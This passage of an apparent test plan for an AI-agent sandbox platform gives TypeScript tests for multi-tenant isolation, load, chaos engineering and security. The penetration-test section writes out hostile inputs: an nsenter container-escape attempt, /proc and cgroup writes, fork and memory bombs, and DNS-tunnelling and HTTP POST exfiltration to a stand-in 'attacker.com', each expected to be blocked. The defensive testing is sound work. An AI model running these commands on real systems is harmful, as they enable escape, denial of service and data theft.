    const results = await clientB.searchPatterns('Secret task A', { k: 10 });

    // Should not find Tenant A's patterns
    expect(results).toHaveLength(0);
  });

  it('should sync with peer hubs', async () => {
    const hub2 = new SandboxFederationHub({
      region: 'test-region-2',
      quicPort: 5434,
      agentdb: ':memory:'
    });
    await hub2.start();

    // Connect hubs
    await hub.connectToPeer(`quic://localhost:5434`);

    // Store pattern in hub1
    const client1 = new ReasoningBankClient({
      endpoint: 'quic://localhost:5433',
      jwt: await hub.issueToken({ tenantId: 'test-tenant' })
    });

    await client1.storePattern({
      sessionId: 'sync-test',
      task: 'Sync test pattern',
      output: {},
      reward: 0.9,
      success: true
    });

    // Wait for sync
    await new Promise(resolve => setTimeout(resolve, 200));

    // Query from hub2
    const client2 = new ReasoningBankClient({
      endpoint: 'quic://localhost:5434',
      jwt: await hub2.issueToken({ tenantId: 'test-tenant' })
    });

    const results = await client2.searchPatterns('Sync test pattern', { k: 1 });

    expect(results).toHaveLength(1);
    expect(results[0].task).toBe('Sync test pattern');

    await hub2.shutdown();
  }, 10000);

  it('should handle sandbox lifecycle correctly', async () => {
    jest.useFakeTimers();

    const agent = await hub.spawnEphemeralAgent({
      agentType: 'coder',
      task: 'Quick task',
      lifetime: 5, // 5 seconds
      sandboxProvider: new DockerSandboxProvider(),
      tenantId: 'test-tenant'
    });

    // Verify sandbox exists
    const sandbox = await hub.getSandbox(agent.sandboxId);
    expect(sandbox.status).toBe('running');

    // Fast-forward past lifetime
    jest.advanceTimersByTime(6000);

    // Sandbox should be destroyed
    await expect(
      hub.getSandbox(agent.sandboxId)
    ).rejects.toThrow('Sandbox not found');

    jest.useRealTimers();
  });
});
```

#### 4-20: Additional Integration Scenarios

```typescript
// tests/integration/additional-scenarios.test.ts

describe('Additional Integration Scenarios', () => {
  describe('Multi-Agent Coordination', () => {
    it('should coordinate 10 sandboxed agents via ReasoningBank', async () => {
      // Scenario: 10 agents refactor different modules and coordinate via memory
      // ... implementation
    });

    it('should handle agent dependencies (agent-2 waits for agent-1)', async () => {
      // Scenario: Sequential dependencies between agents
      // ... implementation
    });
  });

  describe('Resource Management', () => {
    it('should enforce global CPU limits across sandboxes', async () => {
      // Scenario: Total CPU usage across all sandboxes cannot exceed limit
      // ... implementation
    });

    it('should queue sandbox requests when at capacity', async () => {
      // Scenario: Gracefully queue requests instead of failing
      // ... implementation
    });
  });

  describe('Network Isolation', () => {
    it('should prevent sandbox-to-sandbox direct communication', async () => {
      // Scenario: Sandboxes can only talk via coordinator
      // ... implementation
    });

    it('should enforce whitelist-based egress filtering', async () => {
      // Scenario: Only allowed hosts are reachable
      // ... implementation
    });
  });

  describe('Failure Recovery', () => {
    it('should recover from sandbox crash mid-execution', async () => {
      // Scenario: Sandbox crashes, system detects and retries
      // ... implementation
    });

    it('should handle coordinator failure with minimal data loss', async () => {
      // Scenario: Coordinator restarts, agents reconnect
      // ... implementation
    });
  });

  describe('Performance Under Load', () => {
    it('should maintain <100ms latency under 50 concurrent agents', async () => {
      // Scenario: Performance benchmarking
      // ... implementation
    });

    it('should scale to 100 sandboxes without degradation', async () => {
      // Scenario: Scalability testing
      // ... implementation
    });
  });

  // ... Additional scenarios 10-20
});
```

---

## Performance Testing

### Load Test Specifications

#### 1. Load Test: 100 Concurrent Agents

```typescript
// tests/performance/load-100.test.ts
import { SandboxManager } from '@/sandbox/manager';
import { SandboxSwarmCoordinator } from '@/swarm/sandbox-coordinator';

describe('Load Test: 100 Concurrent Agents', () => {
  let manager: SandboxManager;
  let coordinator: SandboxSwarmCoordinator;

  beforeAll(() => {
    manager = new SandboxManager({
      defaultProvider: 'docker',
      providers: {
        docker: new DockerSandboxProvider()
      },
      limits: {
        maxConcurrentSandboxes: 100
      }
    });

    coordinator = new SandboxSwarmCoordinator({
      topology: 'hierarchical',
      sandboxManager: manager
    });
  });

  it('should handle 100 concurrent agents with <10% latency increase', async () => {
    const tasks = Array(100).fill(null).map((_, i) => ({
      id: `task-${i}`,
      description: `Refactor module-${i}.ts`
    }));

    const startTime = Date.now();

    const results = await coordinator.executeSwarm({
      tasks: tasks.map(t => t.description),
      agentType: 'coder',
      batchSize: 100
    });

    const totalDuration = Date.now() - startTime;
    const avgDuration = totalDuration / 100;

    // Baseline: native execution = ~2000ms per agent
    // With sandboxes: expect <2200ms per agent (10% overhead)
    expect(avgDuration).toBeLessThan(2200);
    expect(results.successRate).toBeGreaterThan(0.95); // 95%+ success
  }, 300000); // 5 min timeout

  it('should maintain resource limits under load', async () => {
    const tasks = Array(100).fill(null).map((_, i) => `Task ${i}`);

    await coordinator.executeSwarm({
      tasks,
      agentType: 'coder',
      batchSize: 100
    });

    const usage = await manager.getTotalResourceUsage();

    // Each sandbox: 500m CPU, 512MB memory
    // 100 sandboxes: 50 CPU, 51.2GB memory
    expect(usage.cpuMillis).toBeLessThanOrEqual(50000);
    expect(usage.memoryMB).toBeLessThanOrEqual(51200);
  }, 300000);

  it('should have <100ms P95 QUIC RPC latency under load', async () => {
    const latencies: number[] = [];
    const reasoningBank = new ReasoningBankClient({
      endpoint: 'quic://localhost:5433',
      jwt: 'test-token'
    });

    // Generate load: 1000 RPC calls
    await Promise.all(
      Array(1000).fill(null).map(async (_, i) => {
        const startTime = Date.now();

        await reasoningBank.storePattern({
          sessionId: `load-test-${i}`,
          task: `Task ${i}`,
          output: {},
          reward: 0.9,
          success: true
        });

        latencies.push(Date.now() - startTime);
      })
    );

    const p95Latency = latencies.sort()[Math.floor(latencies.length * 0.95)];
    expect(p95Latency).toBeLessThan(100); // <100ms P95
  }, 60000);
});
```

#### 2. Load Test: 1000 Concurrent Agents

```typescript
// tests/performance/load-1000.test.ts
describe('Load Test: 1000 Concurrent Agents', () => {
  it('should scale to 1000 concurrent agents with batching', async () => {
    const manager = new SandboxManager({
      defaultProvider: 'docker',
      providers: {
        docker: new DockerSandboxProvider()
      },
      limits: {
        maxConcurrentSandboxes: 100 // Batch in groups of 100
      }
    });

    const coordinator = new SandboxSwarmCoordinator({
      topology: 'hierarchical',
      sandboxManager: manager,
      batchSize: 100 // Process 100 at a time
    });

    const tasks = Array(1000).fill(null).map((_, i) => `Task ${i}`);

    const startTime = Date.now();

    const results = await coordinator.executeSwarm({
      tasks,
      agentType: 'coder',
      batchSize: 100
    });

    const totalDuration = Date.now() - startTime;

    // With batching: ~10 batches × 2.5s = ~25s total
    expect(totalDuration).toBeLessThan(30000); // <30s
    expect(results.successRate).toBeGreaterThan(0.90); // 90%+ success
  }, 600000); // 10 min timeout

  it('should use sandbox pooling for efficiency', async () => {
    const manager = new SandboxManager({
      defaultProvider: 'docker',
      providers: {
        docker: new DockerSandboxProvider()
      },
      poolConfig: {
        enabled: true,
        maxPoolSize: 50,
        warmUpCount: 10
      }
    });

    // Warm up pool
    await manager.warmUpPool('node', 10);

    const startTime = Date.now();

    // Execute with warmed pool
    const tasks = Array(1000).fill(null).map((_, i) => `Task ${i}`);
    const coordinator = new SandboxSwarmCoordinator({
      topology: 'hierarchical',
      sandboxManager: manager
    });

    await coordinator.executeSwarm({
      tasks,
      agentType: 'coder',
      batchSize: 100,
      reuseWarmSandboxes: true
    });

    const duration = Date.now() - startTime;

    // Pooling should save ~200ms per sandbox
    // 1000 sandboxes × 200ms savings = 200s savings
    expect(duration).toBeLessThan(25000); // <25s with pooling
  }, 600000);
});
```

#### 3. Stress Test: Resource Exhaustion

```typescript
// tests/performance/stress-resource-exhaustion.test.ts
describe('Stress Test: Resource Exhaustion', () => {
  it('should gracefully handle memory exhaustion', async () => {
    const manager = new SandboxManager({
      defaultProvider: 'docker',
      providers: {
        docker: new DockerSandboxProvider()
      },
      limits: {
        maxTotalMemoryMB: 4096 // 4GB total limit
      }
    });

    const sandboxes: ISandbox[] = [];

    // Create sandboxes until limit reached
    while (true) {
      try {
        const sandbox = await manager.createSandbox({
          template: 'node',
          resources: { memoryMB: 512 }
        });
        sandboxes.push(sandbox);
      } catch (error: any) {
        expect(error.message).toContain('Resource limit exceeded');
        break;
      }
    }

    // Should have created ~8 sandboxes (4096MB / 512MB)
    expect(sandboxes.length).toBeGreaterThanOrEqual(7);
    expect(sandboxes.length).toBeLessThanOrEqual(9);

    // Cleanup
    await Promise.all(sandboxes.map(s => s.destroy()));
  }, 60000);

  it('should enforce CPU limits and prevent hogging', async () => {
    const manager = new SandboxManager({
      defaultProvider: 'docker',
      providers: {
        docker: new DockerSandboxProvider()
      }
    });

    const sandbox = await manager.createSandbox({
      template: 'node',
      resources: {
        cpuMillis: 500 // 0.5 CPU
      }
    });

    // Try to use 100% CPU (should be throttled to 50%)
    const result = await sandbox.execute(`
      node -e "
        const start = Date.now();
        while (Date.now() - start < 5000) {
          Math.random() * Math.random();
        }
      "
    `);

    expect(result.exitCode).toBe(0);

    // Check actual CPU usage was limited
    const usage = await sandbox.getResourceUsage();
    expect(usage.cpuPercent).toBeLessThanOrEqual(55); // ~50% with some margin

    await sandbox.destroy();
  }, 15000);

  it('should handle disk quota exhaustion', async () => {
    const sandbox = await manager.createSandbox({
      template: 'node',
      resources: {
        diskMB: 100 // Only 100MB disk
      }
    });

    // Try to write 200MB file (should fail)
    const result = await sandbox.execute(
      'dd if=/dev/zero of=/tmp/largefile bs=1M count=200'
    );

    expect(result.exitCode).not.toBe(0);
    expect(result.stderr).toMatch(/No space left on device/i);

    await sandbox.destroy();
  }, 30000);
});
```

#### 4. Endurance Test: 24-Hour Run

```typescript
// tests/performance/endurance-24h.test.ts
describe('Endurance Test: 24-Hour Run', () => {
  it('should run continuously for 24 hours without memory leaks', async () => {
    const manager = new SandboxManager({
      defaultProvider: 'docker',
      providers: {
        docker: new DockerSandboxProvider()
      },
      poolConfig: {
        enabled: true,
        maxPoolSize: 20
      }
    });

    const startTime = Date.now();
    const endTime = startTime + 24 * 60 * 60 * 1000; // 24 hours
    const samples: {
      timestamp: number;
      memoryMB: number;
      activeSandboxes: number;
      successRate: number;
    }[] = [];

    let iteration = 0;

    while (Date.now() < endTime) {
      iteration++;

      // Execute batch of agents
      const coordinator = new SandboxSwarmCoordinator({
        topology: 'hierarchical',
        sandboxManager: manager
      });

      const result = await coordinator.executeSwarm({
        tasks: Array(10).fill(null).map((_, i) => `Task ${iteration}-${i}`),
        agentType: 'coder',
        batchSize: 10
      });

      // Collect metrics
      const memoryUsage = process.memoryUsage();
      const activeSandboxes = await manager.listSandboxes();

      samples.push({
        timestamp: Date.now(),
        memoryMB: memoryUsage.heapUsed / 1024 / 1024,
        activeSandboxes: activeSandboxes.length,
        successRate: result.successRate
      });

      // Wait 1 minute before next iteration
      await new Promise(resolve => setTimeout(resolve, 60000));
    }

    // Analyze results
    const initialMemory = samples[0].memoryMB;
    const finalMemory = samples[samples.length - 1].memoryMB;
    const memoryGrowth = finalMemory - initialMemory;

    // Memory growth should be <100MB over 24 hours (no leaks)
    expect(memoryGrowth).toBeLessThan(100);

    // Success rate should remain stable
    const avgSuccessRate = samples.reduce((sum, s) => sum + s.successRate, 0) / samples.length;
    expect(avgSuccessRate).toBeGreaterThan(0.95);

    // No sandbox leaks
    const finalActiveSandboxes = samples[samples.length - 1].activeSandboxes;
    expect(finalActiveSandboxes).toBeLessThanOrEqual(20); // Pool size
  }, 24 * 60 * 60 * 1000); // 24 hour timeout
});
```

#### 5. Spike Test: Sudden Traffic

```typescript
// tests/performance/spike-test.test.ts
describe('Spike Test: Sudden Traffic', () => {
  it('should handle sudden spike from 10 to 1000 agents', async () => {
    const manager = new SandboxManager({
      defaultProvider: 'docker',
      providers: {
        docker: new DockerSandboxProvider()
      }
    });

    const coordinator = new SandboxSwarmCoordinator({
      topology: 'hierarchical',
      sandboxManager: manager
    });

    // Baseline: 10 agents
    const baselineStart = Date.now();
    await coordinator.executeSwarm({
      tasks: Array(10).fill(null).map((_, i) => `Task ${i}`),
      agentType: 'coder',
      batchSize: 10
    });
    const baselineDuration = Date.now() - baselineStart;

    // Spike: 1000 agents
    const spikeStart = Date.now();
    await coordinator.executeSwarm({
      tasks: Array(1000).fill(null).map((_, i) => `Task ${i}`),
      agentType: 'coder',
      batchSize: 100
    });
    const spikeDuration = Date.now() - spikeStart;

    // Spike should complete in reasonable time
    expect(spikeDuration).toBeLessThan(60000); // <60s

    // Per-agent latency should not degrade significantly
    const baselinePerAgent = baselineDuration / 10;
    const spikePerAgent = spikeDuration / 1000;
    const degradation = (spikePerAgent - baselinePerAgent) / baselinePerAgent;

    expect(degradation).toBeLessThan(0.5); // <50% degradation
  }, 120000);

  it('should use auto-scaling to handle spike', async () => {
    const manager = new SandboxManager({
      defaultProvider: 'docker',
      providers: {
        docker: new DockerSandboxProvider()
      },
      autoScaling: {
        enabled: true,
        minInstances: 10,
        maxInstances: 100,
        scaleUpThreshold: 0.8, // Scale up at 80% utilization
        scaleDownThreshold: 0.2
      }
    });

    // Start with min instances
    await manager.ensureMinInstances();
    let instances = await manager.listSandboxes();
    expect(instances.length).toBe(10);

    // Trigger spike
    const coordinator = new SandboxSwarmCoordinator({
      topology: 'hierarchical',
      sandboxManager: manager
    });

    await coordinator.executeSwarm({
      tasks: Array(500).fill(null).map((_, i) => `Task ${i}`),
      agentType: 'coder',
      batchSize: 100
    });

    // Should have scaled up
    instances = await manager.listSandboxes();
    expect(instances.length).toBeGreaterThan(10);
    expect(instances.length).toBeLessThanOrEqual(100);

    // Wait for scale down
    await new Promise(resolve => setTimeout(resolve, 60000));

    instances = await manager.listSandboxes();
    expect(instances.length).toBeLessThanOrEqual(20); // Scaled back down
  }, 180000);
});
```

---

## Security Testing

### Penetration Testing Scenarios

```typescript
// tests/security/penetration.test.ts
describe('Security Penetration Testing', () => {
  describe('Container Escape Attempts', () => {
    it('should prevent container escape via privileged syscalls', async () => {
      const sandbox = await manager.createSandbox({
        template: 'node'
      });

      // Attempt to use privileged syscall
      const result = await sandbox.execute(`
        node -e "
          const { execSync } = require('child_process');
          try {
            execSync('nsenter -t 1 -m -u -n -i sh');
            console.log('ESCAPE_SUCCESS');
          } catch (error) {
            console.log('ESCAPE_BLOCKED');
          }
        "
      `);

      expect(result.stdout).toContain('ESCAPE_BLOCKED');
      expect(result.stdout).not.toContain('ESCAPE_SUCCESS');

      await sandbox.destroy();
    });

    it('should prevent container escape via /proc manipulation', async () => {
      const sandbox = await manager.createSandbox({
        template: 'node'
      });

      // Attempt to modify /proc
      const result = await sandbox.execute(
        'echo "malicious" > /proc/sys/kernel/hostname'
      );

      expect(result.exitCode).not.toBe(0);
      expect(result.stderr).toMatch(/Read-only file system|Permission denied/i);

      await sandbox.destroy();
    });

    it('should prevent container escape via cgroup manipulation', async () => {
      const sandbox = await manager.createSandbox({
        template: 'node'
      });

      // Attempt to modify cgroups
      const result = await sandbox.execute(
        'echo "0" > /sys/fs/cgroup/memory/memory.limit_in_bytes'
      );

      expect(result.exitCode).not.toBe(0);

      await sandbox.destroy();
    });
  });

  describe('Resource Exhaustion Attacks', () => {
    it('should prevent fork bomb', async () => {
      const sandbox = await manager.createSandbox({
        template: 'node',
        resources: {
          maxProcesses: 100
        }
      });

      // Attempt fork bomb
      const result = await sandbox.execute(`
        node -e "
          function forkBomb() {
            while (true) {
              require('child_process').spawn('sleep', ['10']);
            }
          }
          try {
            forkBomb();
          } catch (error) {
            console.log('FORK_BOMB_PREVENTED');
          }
        "
      `, { timeout: 5000 });

      expect(result.stdout).toContain('FORK_BOMB_PREVENTED');

      await sandbox.destroy();
    }, 10000);

    it('should prevent memory bomb', async () => {
      const sandbox = await manager.createSandbox({
        template: 'node',
        resources: {
          memoryMB: 256
        }
      });

      // Attempt memory bomb
      const result = await sandbox.execute(`
        node -e "
          try {
            const arrays = [];
            while (true) {
              arrays.push(new Array(1024 * 1024));
            }
          } catch (error) {
            console.log('MEMORY_BOMB_PREVENTED');
          }
        "
      `, { timeout: 5000 });

      expect(result.stdout).toContain('MEMORY_BOMB_PREVENTED');

      await sandbox.destroy();
    }, 10000);

    it('should prevent CPU exhaustion attack', async () => {
      const sandbox = await manager.createSandbox({
        template: 'node',
        resources: {
          cpuMillis: 500
        }
      });

      const startTime = Date.now();

      // Attempt CPU exhaustion
      await sandbox.execute(`
        node -e "
          const start = Date.now();
          while (Date.now() - start < 5000) {
            Math.random() * Math.random();
          }
        "
      `);

      const duration = Date.now() - startTime;

      // Should take ~10s due to CPU throttling (50% CPU)
      expect(duration).toBeGreaterThan(8000);
      expect(duration).toBeLessThan(12000);

      await sandbox.destroy();
    }, 15000);
  });

  describe('Network Isolation Validation', () => {
    it('should prevent access to host network', async () => {
      const sandbox = await manager.createSandbox({
        template: 'node',
        network: { policy: 'none' }
      });

      // Attempt to access host
      const result = await sandbox.execute(
        'ping -c 1 -W 1 host.docker.internal'
      );

      expect(result.exitCode).not.toBe(0);

      await sandbox.destroy();
    });

    it('should prevent sandbox-to-sandbox communication', async () => {
      const sandbox1 = await manager.createSandbox({
        template: 'node',
        network: { policy: 'restricted' }
      });

      const sandbox2 = await manager.createSandbox({
        template: 'node',
        network: { policy: 'restricted' }
      });

      // Get sandbox2's IP
      const ipResult = await sandbox2.execute('hostname -i');
      const sandbox2IP = ipResult.stdout.trim();

      // Attempt to ping sandbox2 from sandbox1
      const pingResult = await sandbox1.execute(
        `ping -c 1 -W 1 ${sandbox2IP}`
      );

      expect(pingResult.exitCode).not.toBe(0);

      await sandbox1.destroy();
      await sandbox2.destroy();
    });

    it('should enforce egress whitelist', async () => {
      const sandbox = await manager.createSandbox({
        template: 'node',
        network: {
          policy: 'restricted',
          allowedHosts: ['api.anthropic.com']
        }
      });

      // Allowed host should be accessible
      const allowedResult = await sandbox.execute(
        'curl -m 5 https://api.anthropic.com'
      );
      expect(allowedResult.exitCode).toBe(0);

      // Disallowed host should be blocked
      const blockedResult = await sandbox.execute(
        'curl -m 5 https://evil.com'
      );
      expect(blockedResult.exitCode).not.toBe(0);

      await sandbox.destroy();
    }, 15000);
  });

  describe('Data Exfiltration Prevention', () => {
    it('should prevent data exfiltration via DNS tunneling', async () => {
      const sandbox = await manager.createSandbox({
        template: 'node',
        network: { policy: 'restricted' }
      });

      // Attempt DNS tunneling
      const result = await sandbox.execute(`
        node -e "
          const dns = require('dns');
          const secret = Buffer.from('secret-data').toString('hex');
          dns.resolve(\\\`\${secret}.attacker.com\\\`, () => {});
        "
      `);

      // DNS should be blocked or monitored
      expect(result.exitCode).toBe(0); // Command runs
      // But DNS requests should be blocked by network policy

      await sandbox.destroy();
    });

    it('should prevent data exfiltration via HTTP POST', async () => {
      const sandbox = await manager.createSandbox({
        template: 'node',
        network: {
          policy: 'restricted',
          allowedHosts: ['api.anthropic.com'] // No attacker.com
        }
      });

      // Attempt HTTP exfiltration
      const result = await sandbox.execute(`
        curl -X POST -d "secret=data" https://attacker.com
      `, { timeout: 5000 });

      expect(result.exitCode).not.toBe(0);

      await sandbox.destroy();
    }, 10000);

    it('should monitor and log suspicious network activity', async () => {
      const sandbox = await manager.createSandbox({
        template: 'node',
        network: { policy: 'restricted' },
        monitoring: {
          networkLogging: true
        }
      });

      // Execute suspicious activity
      await sandbox.execute('curl https://unknown-host.com');

      // Check logs
      const logs = await sandbox.getNetworkLogs();

      expect(logs.length).toBeGreaterThan(0);
      expect(logs[0]).toMatchObject({
        action: 'blocked',
        destination: 'unknown-host.com',
        reason: 'not in whitelist'
      });

      await sandbox.destroy();
    });
  });

  describe('Authentication & Authorization', () => {
    it('should reject expired JWT tokens', async () => {
      const hub = new SandboxFederationHub({
        region: 'test',
        quicPort: 5433
      });
      await hub.start();

      // Create expired token
      const expiredToken = await hub.issueToken({
        tenantId: 'test-tenant',
        expiresIn: -1000 // Already expired
      });

      const client = new ReasoningBankClient({
        endpoint: 'quic://localhost:5433',
        jwt: expiredToken
      });

      await expect(
        client.storePattern({
          sessionId: 'test',
          task: 'test',
          output: {},
          reward: 0,
          success: false
        })
      ).rejects.toThrow('Token expired');

      await hub.shutdown();
    });

    it('should enforce tenant isolation in JWT claims', async () => {
      const hub = new SandboxFederationHub({
        region: 'test',
        quicPort: 5433
      });
      await hub.start();

      // Tenant A token
      const tokenA = await hub.issueToken({ tenantId: 'tenant-a' });
      const clientA = new ReasoningBankClient({
        endpoint: 'quic://localhost:5433',
        jwt: tokenA
      });

      // Tenant B token
      const tokenB = await hub.issueToken({ tenantId: 'tenant-b' });
      const clientB = new ReasoningBankClient({
        endpoint: 'quic://localhost:5433',
        jwt: tokenB
      });

      // Tenant A stores pattern
      await clientA.storePattern({
        sessionId: 'tenant-a-session',
        task: 'Secret task',
        output: { secret: 'A' },
        reward: 0.9,
        success: true
      });

      // Tenant B cannot access Tenant A's data
      const results = await clientB.searchPatterns('Secret task', { k: 10 });
      expect(results).toHaveLength(0);

      await hub.shutdown();
    });
  });
});
```

---

## Chaos Engineering

```typescript
// tests/chaos/chaos-engineering.test.ts
import { ChaosMonkey } from '@/testing/chaos-monkey';

describe('Chaos Engineering Tests', () => {
  let chaosMonkey: ChaosMonkey;

  beforeEach(() => {
    chaosMonkey = new ChaosMonkey({
      targetService: 'sandbox-manager',
      faultInjectionRate: 0.1 // 10% failure rate
    });
  });

  describe('Network Partitions', () => {
    it('should handle coordinator-sandbox network partition', async () => {
      chaosMonkey.injectNetworkPartition({
        source: 'coordinator',
        destination: 'sandbox-*',
        duration: 5000 // 5 seconds
      });

      const coordinator = new SandboxSwarmCoordinator({
        topology: 'hierarchical',
        sandboxManager: manager,
        resilience: {
          networkRetries: 3,
          networkTimeout: 2000
        }
      });

      const result = await coordinator.executeSwarm({
        tasks: Array(10).fill(null).map((_, i) => `Task ${i}`),
        agentType: 'coder',
        batchSize: 10
      });

      // Should detect partition and retry or fail gracefully
      expect(result.errors.some(e => e.includes('network timeout'))).toBe(true);
      expect(result.successRate).toBeGreaterThan(0); // Partial success
    }, 30000);

    it('should recover after network partition heals', async () => {
      const coordinator = new SandboxSwarmCoordinator({
        topology: 'hierarchical',
        sandboxManager: manager
      });

      // Inject transient partition
      chaosMonkey.injectNetworkPartition({
        source: 'coordinator',
        destination: 'sandbox-*',
        duration: 2000 // 2 seconds
      });

      // Wait for partition to heal
      await new Promise(resolve => setTimeout(resolve, 3000));

      // Should recover and complete successfully
      const result = await coordinator.executeSwarm({
        tasks: Array(10).fill(null).map((_, i) => `Task ${i}`),
        agentType: 'coder',
        batchSize: 10
      });

      expect(result.successRate).toBeGreaterThan(0.9);
    }, 30000);
  });

  describe('Process Crashes', () => {
    it('should handle sandbox process crash', async () => {
      const sandbox = await manager.createSandbox({
        template: 'node'
      });

      // Start long-running task
      const executePromise = sandbox.execute(`
        node -e "setTimeout(() => console.log('done'), 10000)"
      `);

      // Inject crash after 1 second
      setTimeout(() => {
        chaosMonkey.killProcess(sandbox.id);
      }, 1000);

      await expect(executePromise).rejects.toThrow('Process crashed');

      // Verify cleanup
      await expect(sandbox.execute('echo test')).rejects.toThrow();
    }, 15000);

    it('should handle coordinator crash and recovery', async () => {
      const coordinator = new SandboxSwarmCoordinator({
        topology: 'hierarchical',
        sandboxManager: manager,
        persistence: {
          enabled: true,
          checkpointInterval: 1000
        }
      });

      // Start long-running swarm
      const swarmPromise = coordinator.executeSwarm({
        tasks: Array(50).fill(null).map((_, i) => `Task ${i}`),
        agentType: 'coder',
        batchSize: 10
      });

      // Crash coordinator after 5 seconds
      setTimeout(() => {
        chaosMonkey.killProcess('coordinator');
      }, 5000);

      // Recover coordinator
      setTimeout(() => {
        coordinator.recover();
      }, 7000);

      // Should complete with partial results
      const result = await swarmPromise;
      expect(result.successRate).toBeGreaterThan(0.5);
    }, 60000);
  });

  describe('Resource Exhaustion', () => {
    it('should handle sudden memory pressure', async () => {
      // Start with normal workload
      const coordinator = new SandboxSwarmCoordinator({
        topology: 'hierarchical',
        sandboxManager: manager
      });

      // Inject memory pressure
      chaosMonkey.consumeMemory('50%'); // Consume 50% of available memory

      // Should still complete, possibly with reduced parallelism
      const result = await coordinator.executeSwarm({
        tasks: Array(20).fill(null).map((_, i) => `Task ${i}`),
        agentType: 'coder',
        batchSize: 10
      });

      expect(result.successRate).toBeGreaterThan(0.7);

      chaosMonkey.releaseMemory();
    }, 60000);

    it('should handle CPU saturation', async () => {
      // Saturate CPU
      chaosMonkey.consumeCPU('90%');

      const startTime = Date.now();

      const coordinator = new SandboxSwarmCoordinator({
        topology: 'hierarchical',
        sandboxManager: manager
      });

      await coordinator.executeSwarm({
        tasks: Array(10).fill(null).map((_, i) => `Task ${i}`),
        agentType: 'coder',
        batchSize: 10
      });

      const duration = Date.now() - startTime;

      // Should take longer due to CPU contention
      expect(duration).toBeGreaterThan(5000);

      chaosMonkey.releaseCPU();
    }, 60000);
  });

  describe('Clock Skew', () => {
    it('should handle clock skew between coordinator and sandboxes', async () => {
      // Skew sandbox clock by +1 hour
      chaosMonkey.skewClock('sandbox-*', 3600);

      const coordinator = new SandboxSwarmCoordinator({
        topology: 'hierarchical',
        sandboxManager: manager
      });

      // Should detect and handle clock skew
      const result = await coordinator.executeSwarm({
        tasks: Array(5).fill(null).map((_, i) => `Task ${i}`),
        agentType: 'coder',
        batchSize: 5
      });

      expect(result.warnings.some(w => w.includes('clock skew'))).toBe(true);
      expect(result.successRate).toBeGreaterThan(0.8);

      chaosMonkey.resetClock('sandbox-*');
    }, 30000);
  });

  describe('Cascading Failures', () => {
    it('should prevent cascading failures from sandbox to host', async () => {
      const coordinator = new SandboxSwarmCoordinator({
        topology: 'hierarchical',
        sandboxManager: manager,
        circuitBreaker: {
          enabled: true,
          threshold: 0.5, // Open circuit if 50% failures
          resetTimeout: 5000
        }
      });

      // Inject 80% failure rate in sandboxes
      chaosMonkey.injectFailures({
        target: 'sandbox-*',
        rate: 0.8
      });

      const result = await coordinator.executeSwarm({
        tasks: Array(20).fill(null).map((_, i) => `Task ${i}`),
        agentType: 'coder',
        batchSize: 10
      });

      // Circuit breaker should open and prevent cascading failures
      expect(result.circuitBreakerTripped).toBe(true);
      expect(result.hostCrashed).toBe(false);

      chaosMonkey.clearFailures();
    }, 60000);
  });
});
```

---

## Test Automation Architecture

```typescript
// tests/utils/test-automation.ts

/**
 * Test Automation Framework
 */
export class TestAutomation {
  private readonly config: TestAutomationConfig;
  private readonly metrics: TestMetrics;

  constructor(config: TestAutomationConfig) {
    this.config = config;
    this.metrics = new TestMetrics();
  }

  /**
   * Setup test environment
   */
  async setupEnvironment(): Promise<TestEnvironment> {
    // 1. Start required services
    const services = await this.startServices([
      'reasoningbank-server',
      'federation-hub',
      'sandbox-manager'
    ]);

    // 2. Create test sandboxes
    const sandboxes = await this.provisionTestSandboxes(10);

    // 3. Seed test data
    await this.seedTestData();

    // 4. Configure monitoring
    await this.setupMonitoring();

    return {
      services,
      sandboxes,
      cleanup: async () => {
        await this.cleanupEnvironment();
      }
    };
  }

  /**
   * Run test suite with automatic retry
   */
  async runTestSuite(
    suite: string,
    options: { maxRetries?: number; parallel?: boolean } = {}
  ): Promise<TestResults> {
    const maxRetries = options.maxRetries || 3;
    let attempt = 0;

    while (attempt < maxRetries) {
      try {
        const results = options.parallel
          ? await this.runParallel(suite)
          : await this.runSequential(suite);

        if (results.failureCount === 0) {
          return results;
        }

        attempt++;
        if (attempt < maxRetries) {
          console.log(`Retrying failed tests (attempt ${attempt + 1}/${maxRetries})...`);
        }
      } catch (error) {
        attempt++;
        if (attempt >= maxRetries) {
          throw error;
        }
      }
    }

    throw new Error(`Test suite failed after ${maxRetries} attempts`);
  }

  /**
   * Collect and report metrics
   */
  async collectMetrics(): Promise<TestMetrics> {
    return {
      totalTests: this.metrics.totalTests,
      passed: this.metrics.passed,
      failed: this.metrics.failed,
      skipped: this.metrics.skipped,
      duration: this.metrics.duration,
      coverage: await this.calculateCoverage(),
      performance: await this.getPerformanceMetrics()
    };
  }

  /**
   * Generate test report
   */
  async generateReport(format: 'html' | 'json' | 'markdown'): Promise<string> {
    const metrics = await this.collectMetrics();

    switch (format) {
      case 'html':
        return this.generateHTMLReport(metrics);
      case 'json':
        return JSON.stringify(metrics, null, 2);
      case 'markdown':
        return this.generateMarkdownReport(metrics);
    }
  }

  private async startServices(services: string[]): Promise<Service[]> {
    return Promise.all(
      services.map(async (serviceName) => {
        const service = await this.serviceRegistry.start(serviceName);
        await this.waitForHealthy(service);
        return service;
      })
    );
  }

  private async provisionTestSandboxes(count: number): Promise<ISandbox[]> {
    const manager = new SandboxManager({
      defaultProvider: 'docker',
      providers: {
        docker: new DockerSandboxProvider()
      }
    });

    return Promise.all(
      Array(count).fill(null).map(() =>
        manager.createSandbox({
          template: 'node',
          resources: {
            cpuMillis: 500,
            memoryMB: 512
          }
        })
      )
    );
  }

  private async calculateCoverage(): Promise<CoverageReport> {
    // Run istanbul/nyc for coverage
    const coverage = await this.coverageTool.report();

    return {
      statements: coverage.statements.pct,
      branches: coverage.branches.pct,
      functions: coverage.functions.pct,
      lines: coverage.lines.pct
    };
  }
}

/**
 * Test fixtures and data generation
 */
export class TestDataGenerator {
  /**
   * Generate realistic test data
   */
  generateSandboxConfigs(count: number): SandboxConfig[] {
    return Array(count).fill(null).map((_, i) => ({
      template: ['node', 'python', 'rust'][i % 3],
      lifetime: 300 + i * 10,
      resources: {
        cpuMillis: 500,
        memoryMB: 512,
        diskMB: 1024
      },
      network: {
        policy: 'restricted' as const,
        allowedHosts: ['api.anthropic.com']
      }
    }));
  }

  /**
   * Generate test tasks
   */
  generateTasks(count: number): string[] {
    const templates = [
      'Refactor module ${i}.ts to use async/await',
      'Add unit tests for component ${i}',
      'Optimize function ${i} for performance',
      'Fix bug in module ${i}',
      'Update documentation for ${i}'
    ];

    return Array(count).fill(null).map((_, i) =>
      templates[i % templates.length].replace('${i}', String(i))
    );
  }

  /**
   * Generate realistic memory patterns
   */
